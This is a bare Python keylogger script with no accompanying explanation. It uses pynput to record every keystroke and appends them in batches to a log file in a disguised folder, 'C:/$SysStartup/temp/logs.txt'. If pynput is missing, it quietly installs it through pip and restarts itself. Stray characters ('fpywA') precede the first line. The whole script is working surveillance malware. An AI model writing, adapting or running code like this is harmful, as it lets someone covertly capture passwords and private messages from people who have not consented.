fpywAfrom subprocess import call

count = 0
keys = ""


def start():
    try:
        import pynput
        from pynput.keyboard import Key, Listener

        global count, keys

        def on_press(key):
            global count, keys
            key = str(key)
            if key == "Key.space":
                keys += " "
                count += 1
            elif key == "Key.backspace":
                keys = keys[:-1]
            else:
                key = key.replace("'", "")
                keys += key
                count += 1
            if count == 10:
                write()
                count = 0
                keys = ""

        def write():
            with open("C:/$SysStartup/temp/logs.txt", "a") as file:
                file.write(keys)

        with Listener(on_press=on_press) as listener:
            listener.join()

    except ModuleNotFoundError:
        call(["pip", "install", "pynput"], shell=True)
        start()


start()
